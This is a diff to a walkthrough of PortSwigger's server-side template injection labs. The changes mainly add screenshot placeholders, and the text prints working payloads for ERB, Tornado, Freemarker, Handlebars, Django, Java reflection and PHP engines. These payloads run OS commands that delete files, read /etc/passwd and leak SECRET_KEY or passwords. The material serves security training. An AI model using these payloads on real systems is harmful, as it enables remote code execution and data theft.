@@ -35,6 +35,9 @@ Rough engine map:
 A mathematical probe like `{{7*7}}` rendering `49` (not the literal string) confirms evaluation.
 
 ## Lab 1 — Basic server-side template injection
+> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `<%= 7*7 %>`.
+> _Save as_ `images/portswigger-ssti-labs/1.png` _then replace this block with_ `![Lab 1 — Basic server-side template injection](/images/portswigger-ssti-labs/1.png)`_._
+
 
 **Difficulty:** Practitioner
 **Engine:** ERB (Ruby)
@@ -58,9 +61,13 @@ The page renders `49`, confirming SSTI. Ruby's `system()` executes OS commands, 
 <%= system("rm /home/carlos/morale.txt") %>
 ```
 
-> **[Screenshot]** The `49` probe, then the `system()` payload solving the lab.
+> **Picture goes here (#2).** The `49` probe, then the `system()` payload solving the lab.
+> _Save as_ `images/portswigger-ssti-labs/2.png` _then replace this block with_ `![Lab 1 — Basic server-side template injection](/images/portswigger-ssti-labs/2.png)`_._
 
 ## Lab 2 — Basic SSTI (code context)
+> **Picture goes here (#3).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `blog-post-author-display=user.name}}{{7*7}}`.
+> _Save as_ `images/portswigger-ssti-labs/3.png` _then replace this block with_ `![Lab 2 — Basic SSTI (code context)](/images/portswigger-ssti-labs/3.png)`_._
+
 
 **Difficulty:** Practitioner
 **Engine:** Tornado (Python)
@@ -83,9 +90,13 @@ blog-post-author-display=user.name}}{% import os %}{{os.system('rm /home/carlos/
 
 3. Reload the comment to execute.
 
-> **[Screenshot]** `Peter Wiener49}}` proof, then the `os.system` payload.
+> **Picture goes here (#4).** `Peter Wiener49}}` proof, then the `os.system` payload.
+> _Save as_ `images/portswigger-ssti-labs/4.png` _then replace this block with_ `![Lab 2 — Basic SSTI (code context)](/images/portswigger-ssti-labs/4.png)`_._
 
 ## Lab 3 — SSTI using documentation
+> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt`.
+> _Save as_ `images/portswigger-ssti-labs/5.png` _then replace this block with_ `![Lab 3 — SSTI using documentation](/images/portswigger-ssti-labs/5.png)`_._
+
 
 **Difficulty:** Practitioner
 **Engine:** Freemarker (Java)
@@ -99,9 +110,13 @@ Editing a product template with `${foobar}` reveals Freemarker. Its documentatio
 
 Save the template and view the product page.
 
-> **[Screenshot]** The `Execute` built-in payload in the template editor.
+> **Picture goes here (#6).** The `Execute` built-in payload in the template editor.
+> _Save as_ `images/portswigger-ssti-labs/6.png` _then replace this block with_ `![Lab 3 — SSTI using documentation](/images/portswigger-ssti-labs/6.png)`_._
 
 ## Lab 4 — SSTI in an unknown language with a documented exploit
+> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `wrtz{{#with "s" as |string|}}`.
+> _Save as_ `images/portswigger-ssti-labs/7.png` _then replace this block with_ `![Lab 4 — SSTI in an unknown language with a documented exploit](/images/portswigger-ssti-labs/7.png)`_._
+
 
 **Difficulty:** Practitioner
 **Engine:** Handlebars (Node.js)
@@ -133,9 +148,13 @@ wrtz{{#with "s" as |string|}}
 
 URL-encode it as the `message` parameter and load the page.
 
-> **[Screenshot]** The Handlebars prototype-walk exploit in the URL and the lab solving.
+> **Picture goes here (#8).** The Handlebars prototype-walk exploit in the URL and the lab solving.
+> _Save as_ `images/portswigger-ssti-labs/8.png` _then replace this block with_ `![Lab 4 — SSTI in an unknown language with a documented exploit](/images/portswigger-ssti-labs/8.png)`_._
 
 ## Lab 5 — SSTI with information disclosure via user-supplied objects
+> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `{% debug %}`.
+> _Save as_ `images/portswigger-ssti-labs/9.png` _then replace this block with_ `![Lab 5 — SSTI with information disclosure via user-supplied objects](/images/portswigger-ssti-labs/9.png)`_._
+
 
 **Difficulty:** Practitioner
 **Engine:** Django (Python)
@@ -157,9 +176,13 @@ URL-encode it as the `message` parameter and load the page.
 
 5. Save the template and submit the key.
 
-> **[Screenshot]** `{% debug %}` output listing `settings`, then the leaked `SECRET_KEY`.
+> **Picture goes here (#10).** `{% debug %}` output listing `settings`, then the leaked `SECRET_KEY`.
+> _Save as_ `images/portswigger-ssti-labs/10.png` _then replace this block with_ `![Lab 5 — SSTI with information disclosure via user-supplied objects](/images/portswigger-ssti-labs/10.png)`_._
 
 ## Lab 6 — SSTI in a sandboxed environment
+> **Picture goes here (#11).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('`.
+> _Save as_ `images/portswigger-ssti-labs/11.png` _then replace this block with_ `![Lab 6 — SSTI in a sandboxed environment](/images/portswigger-ssti-labs/11.png)`_._
+
 
 **Difficulty:** Expert
 **Engine:** Java (sandboxed)
@@ -173,9 +196,13 @@ ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()
 
 The output is the file contents as decimal ASCII bytes. Convert them back to text and submit the password.
 
-> **[Screenshot]** The reflection chain returning byte values, and the decoded password.
+> **Picture goes here (#12).** The reflection chain returning byte values, and the decoded password.
+> _Save as_ `images/portswigger-ssti-labs/12.png` _then replace this block with_ `![Lab 6 — SSTI in a sandboxed environment](/images/portswigger-ssti-labs/12.png)`_._
 
 ## Lab 7 — SSTI with a custom exploit
+> **Picture goes here (#13).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `user.setAvatar('/etc/passwd','image/jpg')`.
+> _Save as_ `images/portswigger-ssti-labs/13.png` _then replace this block with_ `![Lab 7 — SSTI with a custom exploit](/images/portswigger-ssti-labs/13.png)`_._
+
 
 **Difficulty:** Expert
 **Engine:** PHP (custom object)
@@ -209,7 +236,8 @@ then:
 user.gdprDelete()
 ```
 
-> **[Screenshot]** Reading `/etc/passwd` via the avatar, then invoking `gdprDelete()`.
+> **Picture goes here (#14).** Reading `/etc/passwd` via the avatar, then invoking `gdprDelete()`.
+> _Save as_ `images/portswigger-ssti-labs/14.png` _then replace this block with_ `![Lab 7 — SSTI with a custom exploit](/images/portswigger-ssti-labs/14.png)`_._
 
 ## SSTI cheat sheet
 
